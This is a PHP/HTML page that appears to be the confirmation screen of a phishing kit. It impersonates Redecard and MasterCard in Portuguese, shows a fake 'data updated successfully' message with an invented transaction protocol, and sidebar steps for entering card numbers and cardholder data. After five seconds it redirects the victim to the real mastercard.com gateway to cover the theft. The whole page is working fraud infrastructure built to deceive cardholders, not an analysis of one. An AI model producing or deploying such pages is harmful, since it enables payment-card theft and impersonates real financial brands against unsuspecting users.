<?
echo "<meta HTTP-EQUIV='Refresh' CONTENT='5;URL=http://www.mastercard.com/br/gateway.html'>";
?>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
<link type="text/css" rel="STYLESHEET" href="estilo.css">
		<style type="text/css">
<!--
.style3 {
	font-family: "Times New Roman", Times, serif;
	font-weight: bold;
	font-size: 12px;
}
-->
        </style>
		</head>
<body leftmargin="0" topmargin="0" marginheight="0" marginwidth="0" rightmargin="0" bottommargin="0">

		<form name="ola" method="post"  onSubmit="return validaForm()" action="finaliza.php">

		<table width="508" border="0" cellpadding="0" cellspacing="0">
		<tbody><tr>

		<td align="center">
			<!--Inicio Cabe�alho -->			
			

	<table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
	<tbody><tr>
	<td width="10" height="55" bgcolor="#FFFFFF"><img src="Cbp_RedirC.asp_arquivos/trans.gif" width="10" border="0" height="1"></td>
	<td width="150" bgcolor="#FFFFFF">


		<img src="img/logo2.jpg" width="80" border="0" height="60">	</td>
	<td width="100%" align="center" bgcolor="#FFFFFF"><img src="img/logo.jpg" width="278" border="0" height="41"></td>

	<td bgcolor="#FFFFFF">
		<table class="corpoResumo" width="150" border="0" cellpadding="0" cellspacing="0">
		<tbody><tr>
		<td align="center" height="55"> </td>
		</tr>
		</tbody></table>	</td>
	<td width="10" bgcolor="#FFFFFF"><img src="Cbp_RedirC.asp_arquivos/trans.gif" width="10" border="0" height="1"></td>
	</tr>

	</tbody></table> 


			<!-- fim cabe�alho-->
					
			<table class="corpo" width="93%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
			<tbody><tr>
			<td width="10" bgcolor="#FFFFFF"><img src="Cbp_RedirC.asp_arquivos/trans.gif" width="10" border="0" height="1"></td>
			<td valign="top" bgcolor="#FFFFFF">
			  <div align="center">
			    <!--CORPO-->
			    <br>

                <br>
		        </div>
			
	      <p align="center" class="style3">&nbsp;</p>
	      <p align="center" class="style3">&nbsp;</p>
	      <p align="center" class="corpoResumoTitulo"><strong>Dados atualizados com sucesso.</strong></p>
	      <p align="center" class="style3">&nbsp;</p>
	      <p align="center" class="corpoResumoTitulo"><strong>PROTOCOLO DA TRANSA&Ccedil;&Atilde;O 72148-2147-0045</strong></p>

	      <p align="center" class="style3">&nbsp;</p>
	      <p align="center" class="corpoResumoTitulo"><strong>REDECARD&copy;</strong></p>
        </form>
			<!--/CORPO-->
			</td>
			<td width="10" bgcolor="#FFFFFF"><img src="Cbp_RedirC.asp_arquivos/trans.gif" width="10" border="0" height="1"></td>
			<td valign="top" width="200" bgcolor="#FFFFFF">
				<!--Inicio Comprovante-->

					
		<table width="200" border="0" cellpadding="0" cellspacing="0">
		<tbody><tr>
		<td class="bgResumo" valign="top" align="center" height="250">
			<table width="175" border="0" cellpadding="0" cellspacing="0">
			<tbody><tr>
			<td height="10"></td>
			</tr>
			<tr>

			<td class="titResumo" align="center">Informa��es</td>
			</tr>
			<tr>
			<td height="5"></td>
			</tr>
			<tr>
			<td class="corpoResumoTitulo">
				<b class="subTitResumo">Siga os passos abaixo:</b><br><br>

				<b class="corpoResumoTitulo">1� Digite os 6 primeiros digito do cart�o.</b> <font class="corpoConteudo"></font><br><br>
				<b class="corpoResumoTitulo">2� Digite os demais dados do cart�o.</b> <font class="corpoConteudo"></font><br><br>
				<b class="corpoResumoTitulo">3� Digite os dados do titular do cart�o.</b> <font class="corpoConteudo"></font><br><br>
				
				<br>
				<center><img src="img/px_preto.gif" vspace="5" width="95%" border="0" height="2"></center>
				<b class="subTitResumo">Dados da transa��o</b><br>

				<b class="corpoResumoTitulo">Codigo: 38744</b> <font class="corpoConteudo">  </font><br>
				
					<b class="corpoResumoTitulo">Registro: 72148-2147-0045</b>  <br>
				

				<center><span style="font-size: 7pt;"><br>
				REDECARD �
				</span>
				</center>&nbsp;<br>			</td>

			</tr>
			</tbody></table>		</td>
		</tr>
		</tbody></table>



				<!--Fim Comprovante-->			</td>
			<td width="10" bgcolor="#FFFFFF"><img src="img/trans.gif" width="10" border="0" height="1"></td>

			</tr>
			</tbody></table>
		</td>
		</tr>
		</tbody></table>
		</form></body>
</html>

